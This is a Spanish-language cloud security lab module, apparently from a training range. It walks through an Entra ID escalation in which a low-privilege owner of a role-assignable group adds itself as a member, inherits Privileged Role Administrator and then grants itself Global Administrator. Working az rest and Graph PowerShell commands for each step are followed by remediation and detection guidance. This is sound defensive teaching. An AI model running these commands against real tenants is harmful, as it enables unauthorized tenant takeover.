# AP03 — Owner de bajo privilegio sobre grupo role-assignable → self-add → Global Administrator

- **Capa:** Entra ID (grupos role-assignable · roles de directorio)
- **Coste:** ~0 en dólares (identity-only, sin cómputo) — **pero requiere Entra ID P1**: los grupos *role-assignable* (`isAssignableToRole = true`) no existen en Entra Free, así que, a diferencia de AP01, este AP necesita un tenant dev/E5 con P1. Teardown con `caelum.ps1 reset` / `destroy`, coste de sesión 0.
- **MITRE ATT&CK:** [T1098](https://attack.mitre.org/techniques/T1098/) (Account Manipulation) · [T1098.003](https://attack.mitre.org/techniques/T1098/003/) (Account Manipulation: Additional Cloud Roles) · [T1078.004](https://attack.mitre.org/techniques/T1078/004/) (Valid Accounts: Cloud Accounts)
- **Mapea a cert:** CARTP / CARTE (lado defensivo adyacente: SC-300, AZ-500)
- **Precondición sembrada por el range:**
  - Grupo de seguridad `caelum-ap03-role-admins` (`azuread_group.ap03_role_admins`) con **`assignable_to_role = true`** (role-assignable, exige P1) y **membership estática vacía** (`members = []`).
  - El usuario de **bajo privilegio** `caelum-user1` (reutiliza `azuread_user.lab[0]`; UPN `caelum-user1@<tenant_domain>`) es el **único owner** del grupo (`owners = [azuread_user.lab[0].object_id]`) — el eslabón mal configurado.
  - El grupo **porta el rol de directorio `Privileged Role Administrator`** (template_id `e8611ab8-c189-46e8-94e1-60213ab1f814`), instanciado con `azuread_directory_role.ap03_pra` y asignado **al grupo** con `azuread_directory_role_assignment.ap03_pra` → todos sus miembros heredan PRA.
  - Todo cableado por Terraform (`enable_ap03 = true`) dentro del módulo existente `entra-identity`, **100% declarativo — sin seed de post-despliegue**. El paso de explotación (el owner se auto-añade a la membership) **no se siembra**: es comportamiento por defecto de Entra que dispara el alumno.
  - **Precondición de permisos de *deploy* (no es un seed de estado vulnerable):** el principal que ejecuta `terraform apply` debe poseer **`Privileged Role Administrator` o `Global Administrator`** (y el app-role `RoleManagement.ReadWrite.Directory`) para poder crear el grupo role-assignable y asignarle PRA.

---

## 🎯 Objetivo didáctico

Que el alumno interiorice que **la propiedad (ownership) de un grupo es un permiso de escritura delegado**, y que cuando ese grupo es *role-assignable* y porta un rol de directorio, el owner hereda una vía de escalada que **no depende de ningún rol de administrador, de ninguna política de tenant ni de ningún atributo auto-escribible**. El núcleo es una regla de autorización por defecto de Entra: la membership de un grupo *role-assignable* **solo** la pueden modificar tres principals — `Global Administrator`, `Privileged Role Administrator` y los **owners del grupo** (Microsoft documenta explícitamente que la gestión de la membership de estos grupos se delega *añadiendo owners*). Así, un usuario de bajo privilegio que sea owner puede **auto-añadirse como miembro**, heredar por grupo el rol `Privileged Role Administrator` y, con él, **auto-concederse `Global Administrator`** (toma de tenant). Es la arista canónica `AZOwns → grupo role-assignable → rol` de BloodHound/AzureHound.

El eje conceptual es que el fallo **no** es el self-add (comportamiento legítimo del owner) sino la **combinación mal auditada**: ownership delegado para "self-service" + grupo que luego se marca role-assignable o recibe un rol privilegiado, con la propiedad nunca re-auditada contra esa asignación. Es un patrón de **alta frecuencia real**.

> **Por qué este primitivo y no un atributo auto-editable (AP03-bis).** La variante "intuitiva" — un usuario reescribe un atributo de su perfil (`department`, `jobTitle`) que alimenta una **regla de membresía dinámica** de un grupo privilegiado — **no se usa como base** por dos motivos técnicos, ambos didácticos:
> 1. En Entra, `PATCH /me` solo deja al usuario tocar un **subconjunto** de campos de perfil M365; las propiedades de directorio que consumen las reglas dinámicas (p. ej. `department`) son **admin-only por defecto**. Hacerlas auto-escribibles exigiría **sembrar una delegación admin extra** — justo el fallo de realismo que hay que evitar.
> 2. Un grupo *role-assignable* **debe** tener membership estática (`Assigned`): Entra **prohíbe la membresía dinámica** en estos grupos **precisamente para impedir este attribute-injection**. Entender esa restricción es parte del *fix*.
>
> Por eso AP03 se construye sobre **ownership** (self-add real, por defecto, sin precondición admin) y techa en un rol de directorio Entra REAL; la variante dinámica queda documentada como *sidebar* para enseñar el límite.

---

## 🔴 Rompe (cómo se explota)

Nivel entrenamiento. Herramientas públicas de referencia: **az cli** (`az rest`), **Microsoft Graph PowerShell** (`Microsoft.Graph`), **ROADtools** (`roadrecon`), **AzureHound**/**BloodHound**.

Todo el flujo se ejecuta **con el token del usuario de bajo privilegio `caelum-user1`** — no hay ningún rol de administrador de partida.

1. **Reconocimiento con credenciales de bajo privilegio (T1098 — recon de la arista `AZOwns`).** Autenticarse como `caelum-user1` y enumerar los objetos que posee; filtrar los grupos *role-assignable*:
   ```bash
   az login --allow-no-subscriptions   # usuario caelum-user1@<tenant_domain>
   # Objetos de los que soy OWNER -> filtrar a grupos y ver cuáles son role-assignable.
   # OJO JMESPath: un campo con '@' o '.' se referencia con comillas DOBLES ("@odata.type");
   # con comillas SIMPLES sería un LITERAL y el filtro saldría SIEMPRE vacío (tabla en blanco).
   az rest --method GET \
     --uri "https://graph.microsoft.com/v1.0/me/ownedObjects" \
     --query "value[?\"@odata.type\"=='#microsoft.graph.group'].{name:displayName,id:id,roleAssignable:isAssignableToRole}" -o table
   # (isAssignableToRole se devuelve por defecto en objetos group; alternativa server-side con type-cast:
   #  .../me/ownedObjects/microsoft.graph.group?\$select=id,displayName,isAssignableToRole )
   ```
   Con grafo: `azurehound -u caelum-user1@<tenant_domain> list groups --tenant <tenantId>` y seguir la arista `AZOwns` → grupo con `isAssignableToRole=true` en BloodHound; o `roadrecon gather` + `roadrecon plugin` para el mismo objetivo offline.

2. **Confirmar el objetivo.** Verificar que `caelum-ap03-role-admins` es role-assignable y qué rol porta:
   ```bash
   # ¿Role-assignable?
   az rest --method GET \
     --uri "https://graph.microsoft.com/v1.0/groups/<groupId>?\$select=displayName,isAssignableToRole"

   # ¿Qué rol de directorio porta el grupo? (el grupo es el principal de la asignación)
   az rest --method GET \
     --uri "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments?\$filter=principalId+eq+'<groupId>'"
   # → roleDefinitionId e8611ab8-c189-46e8-94e1-60213ab1f814 = Privileged Role Administrator.
   #   Todos los miembros del grupo heredan ese rol.
   ```

3. **Abusar de la propiedad — self-add (T1098 · Account Manipulation).** Como **owner** del grupo role-assignable, auto-añadirse a la membership. Entra lo autoriza sin rol admin porque, por defecto, la membership de un grupo role-assignable solo la pueden tocar GA, PRA y los **owners**:
   ```bash
   # Mi propio object id:
   MYID=$(az ad signed-in-user show --query id -o tsv)

   az rest --method POST \
     --uri "https://graph.microsoft.com/v1.0/groups/<groupId>/members/\$ref" \
     --headers "Content-Type=application/json" \
     --body "{\"@odata.id\":\"https://graph.microsoft.com/v1.0/directoryObjects/$MYID\"}"
   ```
   Equivalente con Microsoft Graph PowerShell:
   ```powershell
   # La membership de un grupo role-assignable NO se gestiona con Group.ReadWrite.All /
   # GroupMember.ReadWrite.All: Graph exige RoleManagement.ReadWrite.Directory (ver nota).
   # User.Read permite resolver el object id propio.
   Connect-MgGraph -Scopes "RoleManagement.ReadWrite.Directory","User.Read"
   $myId   = (Get-MgUser -UserId (Get-MgContext).Account).Id   # Account es el UPN, no el GUID -> hay que resolver el object id
   $params = @{ "@odata.id" = "https://graph.microsoft.com/v1.0/directoryObjects/$myId" }
   New-MgGroupMemberByRef -GroupId <groupId> -BodyParameter $params
   ```
   > **Nota de autorización — scope del cliente OAuth vs. propiedad del grupo.** El self-add necesita dos cosas independientes: (1) que el **cliente OAuth** porte un scope de Graph suficiente y (2) **autorización de directorio** sobre ESTE grupo. Para un grupo *role-assignable*, Microsoft exige `RoleManagement.ReadWrite.Directory` para gestionar su membership — **`Group.ReadWrite.All` / `GroupMember.ReadWrite.All` no funcionan**. El camino `az rest` de arriba sí funciona porque Azure CLI es una app de primera parte con scopes amplios **pre-consentidos** (`Directory.AccessAsUser.All`, que delega toda la autorización del usuario), de modo que el límite real pasa a ser la **propiedad del grupo** (Entra delega la gestión de membership de grupos role-assignable, por diseño, añadiendo owners). En cambio `Connect-MgGraph -Scopes "RoleManagement.ReadWrite.Directory"` exige **consentimiento de administrador**: un usuario de bajo privilegio **no** puede auto-concederse ese scope en un tenant estándar. En resumen: ser **owner** aporta la autorización de directorio; el scope del cliente solo habilita la clase de operación.

4. **Materializar el rol heredado (T1098.003 · Additional Cloud Roles).** La pertenencia propaga `Privileged Role Administrator` a la identidad, **pero el token actual no lo refleja**: hay que **re-autenticar** para que las claims `wids`/`roles` recojan el rol (latencia de propagación — no es un fallo del ataque):
   ```bash
   az logout && az login --allow-no-subscriptions   # token nuevo

   # Verificar la pertenencia y el rol heredado:
   az rest --method GET --uri "https://graph.microsoft.com/v1.0/me/memberOf" \
     --query "value[].displayName"
   # Inspeccionar las claims del token (wids incluye el template de PRA):
   az account get-access-token --resource https://graph.microsoft.com --query accessToken -o tsv \
     | cut -d. -f2 | base64 -d 2>/dev/null | jq '.wids, .roles'
   ```
   > **Caveat didáctico — latencia.** Si justo tras el self-add parece que "no funcionó", casi siempre es que el token aún es el antiguo. Forzar un token nuevo (o esperar la propagación) antes de concluir que el paso falló.

5. **Escalada final (T1078.004 · Valid Accounts: Cloud Accounts).** Con `Privileged Role Administrator` — un rol **Tier-0** que puede conceder *cualquier* rol — auto-asignarse (o asignar a un SP controlado) `Global Administrator` (template_id `62e90394-69f5-4237-9190-012177145e10`) → control total del tenant:
   ```bash
   az rest --method POST \
     --uri "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments" \
     --headers "Content-Type=application/json" \
     --body "{\"principalId\":\"$MYID\",\"roleDefinitionId\":\"62e90394-69f5-4237-9190-012177145e10\",\"directoryScopeId\":\"/\"}"
   ```
   Equivalente PowerShell:
   ```powershell
   New-MgRoleManagementDirectoryRoleAssignment -PrincipalId <myObjectId> `
     -RoleDefinitionId "62e90394-69f5-4237-9190-012177145e10" -DirectoryScopeId "/"
   ```
   **Alternativa de persistencia:** en lugar de (o además de) GA, añadir credenciales (password/cert) a aplicaciones/SP privilegiados — una puerta trasera que sobrevive al reset de la membership.

6. **Persistencia / sigilo (didáctico).** Mantener la membership del grupo **conserva el acceso**: ownership + role-assignable es a la vez **vía de acceso y de persistencia**. Observación clave de teardown: **todo objeto creado tras llegar a GA** (apps, SP, credenciales, otras role assignments) queda **fuera del estado de Terraform** y hay que limpiarlo a mano — mismo caveat de *scope fuera-de-estado* que AP02.

7. **Teardown.** `./caelum.ps1 reset` re-aplica con `enable_ap03 = false` (`count = 0`) → destruye el grupo y la asignación de rol y **revierte el self-add**; `members = []` lo revierte también en cualquier re-apply intermedio. Los objetos creados tras escalar a GA se limpian a mano.

---

## 🟢 Arregla (remediación)

1. **Re-auditar la PROPIEDAD de todo grupo role-assignable.** Ningún usuario de bajo privilegio debe ser owner de un grupo que porta roles de directorio. Quitar al usuario como owner o retirar `assignable_to_role` / la asignación de rol del grupo:
   ```powershell
   # Enumerar grupos role-assignable y sus owners:
   Get-MgGroup -Filter "isAssignableToRole eq true" -All |
     ForEach-Object {
       [pscustomobject]@{ Group = $_.DisplayName; Owners = (Get-MgGroupOwner -GroupId $_.Id).AdditionalProperties.userPrincipalName }
     }

   # Quitar al owner de bajo privilegio:
   Remove-MgGroupOwnerByRef -GroupId <groupId> -DirectoryObjectId <userObjectId>
   ```
   En el lab: `./caelum.ps1 reset` (`enable_ap03 = false`).

2. **Preferir asignación de roles a usuarios individuales vía Microsoft Entra PIM** (elegible, activación JIT con aprobación y MFA) en lugar de asignación permanente a grupos. Si se usa *group-assignment* de roles, **restringir la ownership del grupo exclusivamente a administradores**. No gestionar grupos privilegiados por flujos de self-service.

3. **Activar Restricted Management (Restricted Management Administrative Units) para grupos role-assignable** y verificar que solo `Global Administrator` / `Privileged Role Administrator` gestionen su membership; eliminar owners delegados heredados de flujos self-service.

4. **Tratar `Privileged Role Administrator` como rol Tier-0.** Puede conceder CUALQUIER rol, `Global Administrator` incluido. Minimizar sus asignaciones, exigir PIM+MFA y monitorizarlo de forma prioritaria:
   ```powershell
   # Inventario de quién tiene PRA (directo o por grupo):
   Get-MgRoleManagementDirectoryRoleAssignment `
     -Filter "roleDefinitionId eq 'e8611ab8-c189-46e8-94e1-60213ab1f814'" -ExpandProperty principal
   ```

5. **Access reviews recurrentes (Entra ID Governance)** sobre owners y membership de grupos privilegiados; alertar en AuditLogs sobre `Add owner to group` y `Add member to group` dirigidos a grupos role-assignable, y sobre asignaciones de roles de directorio a grupos.

6. **Didáctico — por qué Entra ya bloquea la variante dinámica (AP03-bis).** Un grupo role-assignable **exige membership estática** (`Assigned`): Microsoft **prohíbe** la membresía dinámica en estos grupos precisamente para impedir el *attribute-injection* (escalar reescribiendo un atributo que alimente la regla). No intentar "arreglar" el problema con reglas dinámicas sobre atributos auto-escribibles — es el anti-patrón; entender esa restricción **es** parte del fix.

> **Aviso de teardown.** `reset` revierte el self-add y destruye grupo + asignación, pero **cualquier objeto creado tras escalar a `Global Administrator`** (apps, SP, credenciales, role assignments nuevas) queda **fuera del estado de Terraform** y hay que limpiarlo a mano — mismo caveat de scope que AP02.

---

## 🔵 Detecta

Los eventos delatores están en los **Entra ID Audit Logs**: `Add owner to group` (siembra/abuso de la propiedad), **`Add member to group`** dirigido a un grupo role-assignable (el self-add), `Add member to role`/`Add eligible/scoped member to role` (herencia o auto-asignación de un rol de directorio) y, sobre todo, la **asignación de `Global Administrator`** poco después.

- KQL (Sentinel / Defender XDR): [`detections/kql/AP03-role-assignable-group.kql`](../../detections/kql/AP03-role-assignable-group.kql)
- Sigma: [`detections/sigma/AP03-role-assignable-group.yml`](../../detections/sigma/AP03-role-assignable-group.yml)

Señales de caza complementarias:
- **`Add member to group` cuyo `TargetResources` es un grupo con `isAssignableToRole = true` y cuyo `InitiatedBy` es un usuario de bajo privilegio** que además es **owner** del grupo — es el self-add que materializa la escalada. La correlación owner↔miembro es la señal de oro.
- Secuencia temporal estrecha: `Add member to group` (grupo role-assignable) → nueva autenticación del mismo principal → **`Add member to role` / asignación de `Global Administrator`** por ese mismo `objectId`.
- `Add owner to group` que pone a un **usuario no-administrador** como owner de un grupo que porta (o pasará a portar) un rol de directorio — anomalía de aprovisionamiento.
- Asignación de un **rol de directorio a un grupo** (`Add member to role` con `TargetResources` de tipo *Group*), especialmente roles Tier-0 (`Privileged Role Administrator`, `Global Administrator`).
- Toda actividad de `Privileged Role Administrator` concediendo roles: por diseño es capaz de auto-escalar a GA, así que debe tratarse como evento de máxima prioridad.

---

## 📚 Referencias

- Microsoft — [Create a role-assignable group in Microsoft Entra ID](https://learn.microsoft.com/en-us/entra/identity/role-based-access-control/groups-create-eligible)
- Microsoft — [Use Microsoft Entra groups to manage role assignments](https://learn.microsoft.com/en-us/entra/identity/role-based-access-control/groups-concept)
- Microsoft — [Privileged Role Administrator — built-in roles](https://learn.microsoft.com/en-us/entra/identity/role-based-access-control/permissions-reference#privileged-role-administrator)
- Microsoft — [Microsoft Entra Privileged Identity Management (PIM)](https://learn.microsoft.com/en-us/entra/id-governance/privileged-identity-management/pim-configure)
- SpecterOps — [AzureHound / BloodHound: AZOwns y escalada por grupos](https://bloodhound.specterops.io/)
- MITRE ATT&CK — T1098, T1098.003, T1078.004
